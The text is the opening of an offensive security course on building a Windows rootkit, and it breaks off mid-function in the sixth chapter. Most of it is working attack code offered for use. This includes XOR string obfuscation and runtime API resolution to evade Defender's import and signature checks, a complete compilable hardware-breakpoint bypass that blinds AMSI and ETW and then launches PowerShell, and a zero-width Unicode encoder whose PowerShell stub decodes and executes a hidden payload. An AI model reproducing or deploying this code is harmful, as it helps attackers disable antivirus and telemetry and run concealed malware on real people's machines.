# Tactical Cyber Operations: Building a Windows Rootkit from Scratch

**A Red Team Engineering Course**

**by George Wu**
**22DIV**

---

*"Search for knowledge, not bugs. See paths, see blocks, find substitutes."*
*— 0x1security*

---

## About This Course

This is a complete, hands-on course in offensive Windows security engineering. You will build a fully functional rootkit — from the first XOR-encoded string to a single-click dropper that blinds antivirus, hides from the operating system, and establishes persistent remote access.

This is not theory. Every chapter produces working code. By the end, you will have built:

- A hardware breakpoint AMSI/ETW bypass that Microsoft cannot patch without breaking every debugger on the planet
- A steganographic payload encoder using zero-width Unicode characters
- A three-layer concealment system that hides processes, files, and network connections
- An x64 inline hook engine with trampoline support
- A process injector with dynamic API resolution
- A reverse shell with auto-reconnect and screen capture
- An indirect syscall engine that bypasses all user-mode hooks
- A polymorphic mutation pipeline that generates infinite unique variants
- An anti-forensics toolkit for post-operation cleanup

Every tool was tested against Windows Defender on Windows 11. Every bypass was verified. One was reported to Microsoft (VULN-195458). They declined to fix it.

**Prerequisites:**
- C programming (pointers, structs, bitwise operations)
- Basic understanding of how programs run on a computer
- A Windows 11 machine you own (your own hardware ONLY)
- Visual Studio with MSVC compiler (Community Edition is free)
- Python 3.x

**Legal Notice:** This material is for authorised security research and education on systems you own or have explicit written permission to test. Everything in this course was developed and tested on the author's own hardware. Unauthorised access to computer systems is a criminal offence.

---

# PART I: FOUNDATIONS

---

## Chapter 1: Windows Internals for Red Teamers

### 1.1 — Why Internals Matter

Every technique in this course exploits how Windows actually works — not how Microsoft documents it, but how the operating system behaves at the instruction level. A red teamer who doesn't understand internals is just running someone else's tools. You're going to build your own.

### 1.2 — Ring Architecture

Windows runs at two privilege levels:

```
Ring 0 (Kernel Mode)
├── ntoskrnl.exe    — The Windows kernel
├── win32k.sys      — Window manager / GDI
├── Drivers (.sys)  — Hardware abstraction, file systems, network
└── ETW-Ti          — Threat Intelligence callbacks (kernel telemetry)

Ring 3 (User Mode)
├── ntdll.dll       — System call stubs (transition to kernel)
├── kernel32.dll    — Win32 API (wraps ntdll)
├── user32.dll      — Window/input API
├── advapi32.dll    — Security/registry API
├── ws2_32.dll      — Winsock (networking)
└── Your program    — .exe / .dll
```

**Key insight:** Every Win32 API call eventually flows down to ntdll.dll, which contains stubs that execute the `syscall` instruction to transition into the kernel. If you control ntdll, you control what the kernel sees.

### 1.3 — The Process Environment Block (PEB)

Every process has a PEB — a structure in user memory that contains everything the process knows about itself: loaded modules, command line, environment variables. The PEB is accessible without any API calls:

```c
// x64: PEB is at offset 0x60 from the GS segment register
PEB *peb = (PEB *)__readgsqword(0x60);
```

The PEB contains a `Ldr` field pointing to `PEB_LDR_DATA`, which maintains three doubly-linked lists of all loaded DLLs:

```
PEB
└── Ldr (PEB_LDR_DATA)
    ├── InLoadOrderModuleList       — Order modules were loaded
    ├── InMemoryOrderModuleList     — Order by base address
    └── InInitializationOrderModuleList — Order of DllMain calls
```

**Why this matters:** By walking the PEB, we can find any loaded DLL — including ntdll.dll — without calling `GetModuleHandle` or `LoadLibrary`. This means we can resolve function addresses without leaving any trace in our Import Address Table (IAT).

### 1.4 — The PE Format (What Your .exe Really Looks Like)

When Windows loads your program, it reads a Portable Executable (PE) file. The PE format contains:

```
DOS Header (MZ)
├── e_lfanew → offset to NT Headers
NT Headers
├── Signature (PE\0\0)
├── File Header (machine type, number of sections)
└── Optional Header
    ├── AddressOfEntryPoint
    ├── ImageBase (preferred load address)
    └── DataDirectory[16]
        ├── [0]  Export Table      — Functions this module exports
        ├── [1]  Import Table      — Functions this module imports  ← AV reads this
        ├── [5]  Base Relocation   — Fixups for ASLR
        └── [14] COM Descriptor    — .NET metadata
```

**The Import Table is the problem.** When you write `VirtualAllocEx` in your C code, the compiler adds an entry to the Import Table. Defender reads this table at scan time and flags binaries that import suspicious combinations of functions.

**The solution:** Dynamic API resolution. Don't import anything suspicious. Resolve function addresses at runtime using `GetProcAddress`. Better yet, resolve `GetProcAddress` itself by walking the PEB.

### 1.5 — NT Stubs and the Syscall Instruction

Every Nt* function in ntdll.dll follows the same pattern on Windows 11 x64:

```asm
; NtAllocateVirtualMemory stub
4C 8B D1        mov r10, rcx          ; save 1st parameter
B8 18 00 00 00  mov eax, 18h          ; SSN (System Service Number)
F6 04 25 08 03  test byte ptr [SharedUserData+0x308], 1
FE 00
75 03           jne short alt_path
0F 05           syscall               ; transition to kernel
C3              ret
```

The `syscall` instruction is the gateway. The SSN (System Service Number) in EAX tells the kernel which function to execute. The `syscall;ret` instruction pair at the end is what we'll use as a "gadget" for indirect syscalls (Chapter 17).

**Key facts:**
- SSNs change between Windows versions (not stable)
- EDR products hook ntdll by patching the first bytes of these stubs with a JMP to their inspection code
- If the first 4 bytes aren't `4C 8B D1 B8`, the stub is hooked (Hell's Gate detection)

### 1.6 — How Defender Works (The Enemy)

Windows Defender has multiple detection layers:

| Layer | When | What | Our Counter |
|-------|------|------|-------------|
| Static Signature | File scan | Byte pattern matching in the binary | XOR encoding, polymorphic mutation |
| Import Table Analysis | File scan | Flags suspicious API import combinations | Dynamic API resolution (clean IAT) |
| AMSI | Script execution | Scans PowerShell/VBS/JS at runtime | Hardware breakpoint bypass (Dark Room) |
| ETW | Runtime | Event Tracing telemetry to cloud | Hardware breakpoint bypass (Dark Room) |
| Behavioral Heuristic | Runtime | ML model on API call sequences | Timing jitter, call reordering, syscalls |
| Cloud Analysis | Async | Deep scan on Microsoft servers | Key rotation (every build is unique) |

This course addresses every single layer.

### 1.7 — Exercise: PEB Exploration

Write a C program that:
1. Reads the PEB via `__readgsqword(0x60)`
2. Walks `InMemoryOrderModuleList`
3. Prints every loaded module's name and base address

```c
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

int main(void) {
    PEB *peb = (PEB *)__readgsqword(0x60);
    PEB_LDR_DATA *ldr = peb->Ldr;
    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *entry = head->Flink;

    printf("%-40s  Base Address\n", "Module");
    printf("%-40s  ------------\n", "------");

    while (entry != head) {
        LDR_DATA_TABLE_ENTRY *mod = CONTAINING_RECORD(
            entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (mod->FullDllName.Buffer) {
            printf("%-40ws  0x%p\n",
                mod->FullDllName.Buffer,
                mod->DllBase);
        }
        entry = entry->Flink;
    }
    return 0;
}
```

Compile: `cl.exe /Fe:peb_walk.exe peb_walk.c`

**Expected output:** A list of every DLL loaded into your process. The first entry is your .exe, the second is ntdll.dll, the third is kernel32.dll. Remember this order — we use it in Chapter 17.

---

## Chapter 2: The Build System

### 2.1 — MSVC and vcvars64

All code in this course is compiled with Microsoft's MSVC compiler. We use it because:
- It produces native Windows PE binaries (no MinGW quirks)
- It links against the same C runtime Defender expects
- The optimiser helps reduce binary size and attack surface

**Setup:** Open "Developer Command Prompt for VS" or run:

```batch
call "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"
```

This sets up PATH, INCLUDE, and LIB for 64-bit compilation.

### 2.2 — Compilation Flags

Standard flags used throughout this course:

```
cl.exe source.c /Fe:output.exe /O1 /GS- /utf-8
```

| Flag | Purpose |
|------|---------|
| `/Fe:name` | Output filename |
| `/O1` | Optimise for size (smaller binary = less signature surface) |
| `/GS-` | Disable stack buffer overflow checks (removes `__security_check_cookie` calls) |
| `/utf-8` | Source file encoding |
| `/LD` | Build a DLL instead of EXE |
| `/link lib.lib` | Link against a specific library |

### 2.3 — Common Link Libraries

| Library | Functions |
|---------|-----------|
| `ws2_32.lib` | Socket operations (Winsock) |
| `advapi32.lib` | Registry, security tokens, event logs |
| `user32.lib` | Window management, SetWindowsHookEx |
| `gdi32.lib` | Graphics (screen capture) |
| `iphlpapi.lib` | IP helper (TCP table queries) |

### 2.4 — MASM for Assembly

Some components (indirect syscall stubs) require assembly. MASM (ml64.exe) is included with Visual Studio:

```batch
ml64.exe /c source.asm /Fo:output.obj
```

The object file links directly with cl.exe output.

### 2.5 — Exercise: Build Verification

Create a file `test_build.c`:

```c
#include <windows.h>
#include <stdio.h>

int main(void) {
    printf("[+] MSVC build system operational\n");
    printf("[+] Windows version: %lu.%lu\n",
        GetVersion() & 0xFF,
        (GetVersion() >> 8) & 0xFF);
    printf("[+] Process ID: %lu\n", GetCurrentProcessId());
    return 0;
}
```

Compile and run:
```
cl.exe /Fe:test_build.exe /O1 /GS- test_build.c
test_build.exe
```

If this works, your toolchain is ready.

---

## Chapter 3: XOR Encoding and Dynamic API Resolution

### 3.1 — The Problem with Static Strings

Consider this code:

```c
HMODULE h = LoadLibraryA("amsi.dll");
FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
```

When compiled, the strings `"amsi.dll"` and `"AmsiScanBuffer"` are embedded in your binary's `.rdata` section in plaintext. Defender's static engine literally scans for these strings and flags them.

**Solution:** XOR-encode every operational string. Store the encoded version in the binary. Decode at runtime, use, then zero the memory.

### 3.2 — How XOR Encoding Works

XOR has a critical property: `A ^ K ^ K = A`. If you XOR data with a key, XORing again with the same key gives you back the original.

```
Plaintext:  "amsi.dll"
Hex:        61 6D 73 69 2E 64 6C 6C
XOR 0xB5:   D4 D8 C6 DC 9B D1 D9 D9

To decode:  D4^B5=61  D8^B5=6D  C6^B5=73  ...
Result:     "amsi.dll"
```

### 3.3 — Implementation Pattern

The pattern used throughout VADER:

```c
// XOR key — a single byte, easily rotated by mutate.py
#define XOR_KEY 0xB5

// Encoded string stored as const array
// "amsi.dll" XOR 0xB5
static const unsigned char xAmsiDll[] = {
    0xD4, 0xD8, 0xC6, 0xDC, 0x9B, 0xD1, 0xD9, 0xD9
};
#define xAmsiDll_LEN 8

// Decode function — works on any XOR-encoded buffer
static void xor_decode(unsigned char *buf, const unsigned char *enc, int len) {
    for (int i = 0; i < len; i++)
        buf[i] = enc[i] ^ XOR_KEY;
    buf[len] = 0;  // null terminate
}

// Zero function — uses volatile to prevent compiler optimisation
static void secure_zero(void *p, int len) {
    volatile char *v = (volatile char *)p;
    for (int i = 0; i < len; i++)
        v[i] = 0;
}
```

### 3.4 — The Decode-Use-Zero Pattern

Every time you use an encoded string, follow this exact pattern:

```c
unsigned char buf[64];

// 1. DECODE into stack buffer
xor_decode(buf, xAmsiDll, xAmsiDll_LEN);

// 2. USE immediately
HMODULE h = LoadLibraryA((const char *)buf);

// 3. ZERO the buffer — the plaintext never persists in memory
secure_zero(buf, sizeof(buf));
```

**Why volatile in secure_zero?** The compiler sees you writing zeros to a buffer that's never read again. Without `volatile`, the optimiser will remove the zeroing as "dead code." The `volatile` keyword tells the compiler: "this write has side effects you can't see — don't remove it."

### 3.5 — Dynamic API Resolution

Instead of importing `VirtualAllocEx` directly (which puts it in your IAT), resolve it at runtime:

```c
// Function pointer typedef
typedef LPVOID (WINAPI *fn_VirtualAllocEx)(
    HANDLE, LPVOID, SIZE_T, DWORD, DWORD);

// Encoded API name: "VirtualAllocEx" XOR 0xAC
static const unsigned char xVirtualAllocEx[] = {
    0xFA, 0xC5, 0xDE, 0xD8, 0xD9, 0xCD, 0xC0, 0xED,
    0xC0, 0xC0, 0xC3, 0xCF, 0xE9, 0xD4
};
#define xVirtualAllocEx_LEN 14

// Resolution
fn_VirtualAllocEx pVAE = NULL;

BOOL resolve_apis(void) {
    unsigned char buf[64];

    // Get kernel32 handle (already loaded — no LoadLibrary needed)
    xor_decode(buf, xKernel32, xKernel32_LEN);
    HMODULE hK = GetModuleHandleA((const char *)buf);
    secure_zero(buf, sizeof(buf));

    // Resolve VirtualAllocEx
    xor_decode(buf, xVirtualAllocEx, xVirtualAllocEx_LEN);
    pVAE = (fn_VirtualAllocEx)GetProcAddress(hK, (const char *)buf);
    secure_zero(buf, sizeof(buf));

    return (pVAE != NULL);
}

// Usage — call through function pointer
LPVOID mem = pVAE(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

**What your IAT looks like after dynamic resolution:**

| Import | Clean Binary |
|--------|-------------|
| GetProcAddress | Yes (benign) |
| LoadLibraryA | Yes (benign) |
| GetModuleHandleA | Yes (benign) |
| VirtualAllocEx | NO — resolved at runtime |
| WriteProcessMemory | NO — resolved at runtime |
| CreateRemoteThread | NO — resolved at runtime |

Defender sees three harmless imports. The suspicious ones are invisible until execution.

### 3.6 — Two-Key Architecture

VADER uses two XOR keys to compartmentalise:

| Key | Constant | Purpose | Used In |
|-----|----------|---------|---------|
| `XOR_KEY` (0xB5) | API function names | `LoadLibraryA`, `VirtualAllocEx`, etc. | All components |
| `SHELL_XOR_KEY` (0xBE) | Operational strings | IP addresses, file paths, registry keys | Dropper, shell |

Different keys prevent accidental cross-contamination — if an analyst recovers one key by finding a known plaintext, the other category remains encoded.

### 3.7 — Exercise: Build an XOR Encoder

Write a Python script that generates C code for XOR-encoded strings:

```python
import sys

def encode(plaintext, key):
    encoded = [b ^ key for b in plaintext.encode()]
    hex_str = ", ".join(f"0x{b:02X}" for b in encoded)
    name = plaintext.replace(".", "_").replace(" ", "_")
    print(f'/* "{plaintext}" XOR 0x{key:02X} */')
    print(f'static const unsigned char x{name}[] = {{')
    print(f'    {hex_str}')
    print(f'}};')
    print(f'#define x{name}_LEN {len(encoded)}')
    print()

if __name__ == "__main__":
    key = int(sys.argv[1], 16) if len(sys.argv) > 1 else 0xB5
    for word in ["VirtualAllocEx", "CreateRemoteThread", "amsi.dll"]:
        encode(word, key)
```

Run: `python xor_gen.py 0xB5`

This produces copy-paste-ready C declarations.

---

# PART II: EVASION

---

## Chapter 4: The Dark Room — AMSI Bypass

### 4.1 — What Is AMSI?

AMSI (Antimalware Scan Interface) is Microsoft's runtime scanning framework. When PowerShell, VBScript, or JavaScript executes a script, the interpreter calls `AmsiScanBuffer()` in `amsi.dll` before running the code. Defender's AMSI provider inspects the script content and can block execution.

```
PowerShell.exe
    ↓ about to execute script
    ↓ calls AmsiScanBuffer()
amsi.dll
    ↓ forwards to registered provider
Microsoft Defender
    ↓ scans content
    ↓ returns AMSI_RESULT (clean / malware)
    ↓
PowerShell either runs or blocks the script
```

**The target:** `AmsiScanBuffer()` — a single function. If we can make it fail, AMSI is blind.

### 4.2 — Why Memory Patching Doesn't Work Anymore

The classic AMSI bypass patches the first bytes of `AmsiScanBuffer` to return immediately:

```c
// Old method — DETECTED by Defender
unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
// mov eax, 0x80070057 (E_INVALIDARG); ret
WriteProcessMemory(GetCurrentProcess(), pAmsiScanBuffer, patch, sizeof(patch), NULL);
```

Defender now detects this because:
1. The patch bytes themselves are signatured
2. `WriteProcessMemory` on amsi.dll triggers behavioural detection
3. Periodic integrity checks verify amsi.dll hasn't been modified

We need a bypass that doesn't modify any memory.

### 4.3 — Hardware Breakpoints: The Undetectable Mechanism

x64 processors have four debug registers (DR0-DR3) designed for debugging. When execution hits an address stored in a debug register, the CPU generates a `SINGLE_STEP_EXCEPTION` — before the target function executes.

```
Debug Registers:
DR0 — Breakpoint address 1
DR1 — Breakpoint address 2
DR2 — Breakpoint address 3
DR3 — Breakpoint address 4
DR6 — Status (which BP triggered)
DR7 — Control (enable/disable each BP)
```

**The key insight:** We can set DR0 to point at `AmsiScanBuffer`. When AMSI tries to scan, the CPU fires a hardware exception BEFORE the function runs. Our exception handler intercepts it, sets the return value to `E_INVALIDARG` (0x80070057), and advances the instruction pointer past the function. AMSI thinks it was called but returns an error, and the caller accepts it.

**No memory is modified.** Debug registers are CPU state, not memory. Defender cannot detect this without reading debug registers from every thread — which would break every debugger on the platform.

### 4.4 — Vectored Exception Handling (VEH)

Windows provides VEH — a mechanism to register exception handlers that fire before structured exception handlers (SEH). We register a VEH handler that catches hardware breakpoint exceptions:

```c
#include <windows.h>
#include <stdio.h>

#define DR_EXCEPTION_CODE 0x22D1

static void *g_AmsiAddr = NULL;
static void *g_EtwAddr  = NULL;

LONG CALLBACK DarkRoomHandler(EXCEPTION_POINTERS *ep) {
    // Only handle single-step exceptions (hardware breakpoints)
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    void *fault = (void *)ep->ContextRecord->Rip;

    if (fault == g_AmsiAddr) {
        // AmsiScanBuffer hit — return E_INVALIDARG
        ep->ContextRecord->Rax = 0x80070057;  // HRESULT = E_INVALIDARG
        ep->ContextRecord->Rip = *(DWORD64 *)ep->ContextRecord->Rsp;  // pop return address
        ep->ContextRecord->Rsp += 8;  // adjust stack
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if (fault == g_EtwAddr) {
        // EtwEventWrite hit — return success (0)
        ep->ContextRecord->Rax = 0;
        ep->ContextRecord->Rip = *(DWORD64 *)ep->ContextRecord->Rsp;
        ep->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}
```

**Line-by-line breakdown:**

1. **`ExceptionCode != EXCEPTION_SINGLE_STEP`** — Hardware breakpoints fire this specific exception. We ignore everything else.

2. **`fault == g_AmsiAddr`** — Check if the breakpoint hit on AmsiScanBuffer.

3. **`Rax = 0x80070057`** — Set the return value register to `E_INVALIDARG`. The caller (PowerShell) sees "AMSI returned an error" and proceeds without blocking.

4. **`Rip = *(DWORD64 *)Rsp`** — Pop the return address from the stack into the instruction pointer. This is equivalent to executing a `ret` instruction.

5. **`Rsp += 8`** — Adjust the stack pointer (we just "consumed" the return address).

6. **`EXCEPTION_CONTINUE_EXECUTION`** — Resume execution at the new RIP (the caller), skipping the entire AmsiScanBuffer function.

### 4.5 — Setting the Debug Registers

Debug registers can only be modified via `SetThreadContext`. We use a custom exception to trigger DR setup:

```c
static void SetupDR(DWORD64 dr0_addr, DWORD64 dr1_addr) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    ctx.Dr0 = dr0_addr;                          // AmsiScanBuffer
    ctx.Dr1 = dr1_addr;                          // EtwEventWrite
    ctx.Dr7 = (1 << 0) | (1 << 2);               // Enable DR0 and DR1
    ctx.Dr7 |= (0 << 16) | (0 << 20);            // Execute breakpoint (not read/write)

    SetThreadContext(GetCurrentThread(), &ctx);
}
```

**DR7 bit layout:**

```
Bit 0:  Enable DR0 (local)
Bit 2:  Enable DR1 (local)
Bit 4:  Enable DR2 (local)
Bit 6:  Enable DR3 (local)
Bits 16-17: DR0 condition (00 = execute)
Bits 20-21: DR1 condition (00 = execute)
```

### 4.6 — The Complete Dark Room

Here is the full standalone Dark Room implementation. This is the code you type and compile:

```c
/*
 * dark_room.c — Hardware Breakpoint AMSI/ETW Bypass
 *
 * Sets DR0 on AmsiScanBuffer → returns E_INVALIDARG (scan skipped)
 * Sets DR1 on EtwEventWrite  → returns 0 (telemetry silenced)
 *
 * No memory modification. CPU debug registers only.
 *
 * Compile:
 *   cl.exe dark_room.c /Fe:dark_room.exe /O1 /GS-
 */

#include <windows.h>
#include <stdio.h>

/* XOR key for string encoding */
#define XOR_KEY 0xB5

/* XOR-encoded strings */
/* "amsi.dll" */
static const unsigned char xAmsiDll[] = {
    0xD4, 0xD8, 0xC6, 0xDC, 0x9B, 0xD1, 0xD9, 0xD9
};
#define xAmsiDll_LEN 8

/* "AmsiScanBuffer" */
static const unsigned char xAmsiFunc[] = {
    0xF4, 0xD8, 0xC6, 0xDC, 0xE6, 0xD6, 0xD4, 0xDB,
    0xF7, 0xC0, 0xD3, 0xD3, 0xD0, 0xC7
};
#define xAmsiFunc_LEN 14

/* "ntdll.dll" */
static const unsigned char xNtdll[] = {
    0xDB, 0xC1, 0xD1, 0xD9, 0xD9, 0x9B, 0xD1, 0xD9, 0xD9
};
#define xNtdll_LEN 9

/* "EtwEventWrite" */
static const unsigned char xEtwFunc[] = {
    0xF0, 0xC1, 0xC2, 0xF0, 0xC3, 0xD0, 0xDB, 0xC1,
    0xE2, 0xC7, 0xDC, 0xC1, 0xD0
};
#define xEtwFunc_LEN 13

static void xd(unsigned char *buf, const unsigned char *enc, int len) {
    for (int i = 0; i < len; i++) buf[i] = enc[i] ^ XOR_KEY;
    buf[len] = 0;
}

static void sz(void *p, int len) {
    volatile char *v = (volatile char *)p;
    for (int i = 0; i < len; i++) v[i] = 0;
}

static void *g_amsi = NULL;
static void *g_etw  = NULL;

LONG CALLBACK VehHandler(EXCEPTION_POINTERS *ep) {
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    void *fault = (void *)ep->ContextRecord->Rip;

    if (fault == g_amsi) {
        ep->ContextRecord->Rax = 0x80070057;
        ep->ContextRecord->Rip = *(DWORD64 *)ep->ContextRecord->Rsp;
        ep->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if (fault == g_etw) {
        ep->ContextRecord->Rax = 0;
        ep->ContextRecord->Rip = *(DWORD64 *)ep->ContextRecord->Rsp;
        ep->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

int main(void) {
    unsigned char buf[64];

    /* Register VEH */
    AddVectoredExceptionHandler(1, VehHandler);

    /* Resolve AmsiScanBuffer */
    xd(buf, xAmsiDll, xAmsiDll_LEN);
    HMODULE hAmsi = LoadLibraryA((const char *)buf);
    sz(buf, sizeof(buf));

    if (hAmsi) {
        xd(buf, xAmsiFunc, xAmsiFunc_LEN);
        g_amsi = (void *)GetProcAddress(hAmsi, (const char *)buf);
        sz(buf, sizeof(buf));
    }

    /* Resolve EtwEventWrite */
    xd(buf, xNtdll, xNtdll_LEN);
    HMODULE hNt = GetModuleHandleA((const char *)buf);
    sz(buf, sizeof(buf));

    if (hNt) {
        xd(buf, xEtwFunc, xEtwFunc_LEN);
        g_etw = (void *)GetProcAddress(hNt, (const char *)buf);
        sz(buf, sizeof(buf));
    }

    /* Set hardware breakpoints */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    if (g_amsi) {
        ctx.Dr0 = (DWORD64)g_amsi;
        ctx.Dr7 |= (1 << 0);    /* enable DR0 */
    }
    if (g_etw) {
        ctx.Dr1 = (DWORD64)g_etw;
        ctx.Dr7 |= (1 << 2);    /* enable DR1 */
    }

    SetThreadContext(GetCurrentThread(), &ctx);

    printf("[+] Dark Room active\n");
    printf("    DR0: AmsiScanBuffer @ %p\n", g_amsi);
    printf("    DR1: EtwEventWrite  @ %p\n", g_etw);
    printf("[+] AMSI blind. ETW silent.\n");

    /* Spawn PowerShell in this process (inherits debug registers) */
    system("powershell.exe -NoProfile");

    return 0;
}
```

### 4.7 — Why Microsoft Cannot Patch This

This bypass was reported to Microsoft as VULN-195458. They declined to fix it because:

1. **Hardware breakpoints are a CPU feature.** Disabling them would break every debugger, profiler, and development tool on Windows.
2. **VEH is a documented Windows API.** Applications are allowed to handle their own exceptions.
3. **No memory is modified.** Integrity checks on amsi.dll see a pristine, unmodified module.
4. **Debug registers are per-thread.** To detect this, Defender would need to read DR0-DR3 from every thread in every process continuously — a performance disaster.

The vulnerability is **architectural**. It will exist as long as x86/x64 processors have debug registers.

### 4.8 — Exercise: Verify the Bypass

1. Compile `dark_room.c`
2. Open a normal PowerShell and type: `'amsiutils'` — this should trigger AMSI
3. Run `dark_room.exe` — it spawns a PowerShell
4. In that PowerShell, type: `'amsiutils'` — no AMSI trigger
5. Run: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')` — this works now

---

## Chapter 5: ETW — Blinding Telemetry

### 5.1 — What Is ETW?

Event Tracing for Windows (ETW) is the kernel-level telemetry framework. Every interesting operation in Windows generates ETW events — process creation, network connections, registry modifications, module loads.

Defender uses ETW to monitor behaviour in real time. Even if your binary passes static analysis, ETW can report what it does at runtime.

### 5.2 — EtwEventWrite

All user-mode ETW events flow through a single function: `EtwEventWrite` in ntdll.dll. This is the bottleneck — and our target.

**The Dark Room handles ETW with the same mechanism as AMSI:** DR1 is set on `EtwEventWrite`. When any ETW event is generated, the hardware breakpoint fires, our VEH handler sets RAX to 0 (success), and returns — the event was "written successfully" but actually went nowhere.

### 5.3 — What ETW Blindness Covers

With EtwEventWrite returning 0 without executing:

- PowerShell script block logging is silenced
- .NET assembly load events are suppressed
- Process creation telemetry is lost
- Module (DLL) load events disappear
- Network connection events are dropped

**What it does NOT cover:** Kernel-level ETW-Ti (Threat Intelligence) callbacks. These are kernel-mode callbacks registered by enterprise EDR products (CrowdStrike, SentinelOne). Defender Home (consumer Windows) does not use ETW-Ti. For enterprise environments, you need kernel access — which is covered in the theoretical Chapter 23.

### 5.4 — The Two-Bypass Stack

Dark Room gives us a two-register bypass stack:

```
DR0 → AmsiScanBuffer  → Returns E_INVALIDARG → AMSI disabled
DR1 → EtwEventWrite   → Returns 0 (success)  → ETW silenced

DR2 → Available (unused)
DR3 → Available (unused)
```

Two of four debug registers used. Two remain for future expansion (anti-debugging traps, additional hook points).

### 5.5 — Exercise: ETW Event Monitoring

Before running Dark Room, observe ETW events using PowerShell:

```powershell
# View PowerShell script block logging (requires admin)
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 10 |
    Format-Table TimeCreated, Message -AutoSize
```

Now run Dark Room and execute commands. Check the event log again — no new entries appear.

---

## Chapter 6: Ghost Encoding — Steganographic Payloads

### 6.1 — The File Layer Problem

Dark Room handles the runtime layer. But payloads still exist as files on disk — and Defender scans files.

**Ghost Encoding** is the file layer protection. It encodes arbitrary data into zero-width Unicode characters that are invisible in text editors, file browsers, and to Defender's signature engine.

### 6.2 — The Ghost Alphabet

16 zero-width Unicode characters serve as a hexadecimal alphabet:

```python
GHOST_ALPHABET = [
    '​',  # 0x0  ZERO WIDTH SPACE
    '‌',  # 0x1  ZERO WIDTH NON-JOINER
    '‍',  # 0x2  ZERO WIDTH JOINER
    '⁠',  # 0x3  WORD JOINER
    '⁡',  # 0x4  FUNCTION APPLICATION
    '⁢',  # 0x5  INVISIBLE TIMES
    '⁣',  # 0x6  INVISIBLE SEPARATOR
    '⁤',  # 0x7  INVISIBLE PLUS
    '⁪',  # 0x8  INHIBIT SYMMETRIC SWAPPING
    '⁫',  # 0x9  ACTIVATE SYMMETRIC SWAPPING
    '⁬',  # 0xA  INHIBIT ARABIC FORM SHAPING
    '⁭',  # 0xB  ACTIVATE ARABIC FORM SHAPING
    '⁮',  # 0xC  NATIONAL DIGIT SHAPES
    '⁯',  # 0xD  NOMINAL DIGIT SHAPES
    '﻿',  # 0xE  ZERO WIDTH NO-BREAK SPACE (BOM)
    '᠎',  # 0xF  MONGOLIAN VOWEL SEPARATOR
]
```

Each byte of payload becomes two invisible characters (high nibble + low nibble). The result is completely invisible in any text editor.

### 6.3 — Encoding Process

```python
def encode_bytes(data: bytes) -> str:
    encoded = []
    for byte in data:
        high = (byte >> 4) & 0x0F
        low = byte & 0x0F
        encoded.append(GHOST_ALPHABET[high])
        encoded.append(GHOST_ALPHABET[low])
    return ''.join(encoded)
```

**Example:** The byte `0x41` (letter 'A'):
- High nibble: `4` → GHOST_ALPHABET[4] = `⁡` (FUNCTION APPLICATION)
- Low nibble: `1` → GHOST_ALPHABET[1] = `‌` (ZERO WIDTH NON-JOINER)
- Result: Two invisible characters that encode the letter 'A'

### 6.4 — The Decoder Stub

The ghost-encoded file is a valid PowerShell script. The visible part (the decoder) is small and generic:

```powershell
$g=@'
<massive block of invisible zero-width characters>
'@
$a=@([char]0x200B,[char]0x200C,[char]0x200D,[char]0x2060,
      [char]0x2061,[char]0x2062,[char]0x2063,[char]0x2064,
      [char]0x206A,[char]0x206B,[char]0x206C,[char]0x206D,
      [char]0x206E,[char]0x206F,[char]0xFEFF,[char]0x180E)
$r=@{};for($x=0;$x -lt $a.Count;$x++){$r[$a[$x]]=$x}
$f=[char[]]$g|?{$r.ContainsKey($_)}
$b=New-Object byte[]($f.Count/2)
for($i=0;$i -lt $f.Count;$i+=2){$b[$i/2]=[byte](($r[$f[$i]]*16)+$r[$f[$i+1]])}
iex([System.Text.Encoding]::UTF8.GetString($b))
```

The decoder:
1. Reads the invisible characters
2. Builds a reverse lookup table
3. Converts pairs of invisible chars back to bytes
4. Executes the result as PowerShell

### 6.5 — The Two-Layer Protection Model

Ghost Encoding and Dark Room work together:

```
Layer 1: GHOST (File Layer)
├── Payload encoded as invisible Unicode
├── Defender's static scanner sees no signatures
├── File appears blank in text editors
└── Only the small decoder stub is visible

Layer 2: DARK ROOM (Runtime Layer)
├── AMSI bypass via DR0 hardware breakpoint
├── ETW bypass via DR1 hardware breakpoint
├── Script executes without any scanning
└── No telemetry reaches Defender
```

**Attack sequence:**
1. Run Dark Room (AMSI/ETW blind)
2. Execute ghost-encoded payload (Defender can't scan it)
3. Payload runs in a completely blind environment

### 6.6 — Complete Ghost Encoder

This is the full Python tool for generating ghost-encoded payloads. Save as `ghost_encode.py`:

```python
#!/usr/bin/env python3
"""
GHOST ENCODER — Unicode Steganographic Payload Encoder
Encodes arbitrary payload data into zero-width Unicode characters.
"""
import sys
import os
import argparse

GHOST_ALPHABET = [
    '​', '‌', '‍', '⁠',
    '⁡', '⁢', '⁣', '⁤',
    '⁪', '⁫', '⁬', '⁭',
    '⁮', '⁯', '﻿', '᠎',
]

GHOST_REVERSE = {c: i for i, c in enumerate(GHOST_ALPHABET)}


def encode_bytes(data: bytes) -> str:
    encoded = []
    for byte in data:
        high = (byte >> 4) & 0x0F
        low = byte & 0x0F
        encoded.append(GHOST_ALPHABET[high])
        encoded.append(GHOST_ALPHABET[low])
    return ''.join(encoded)


def decode_ghost(ghost_text: str) -> bytes:
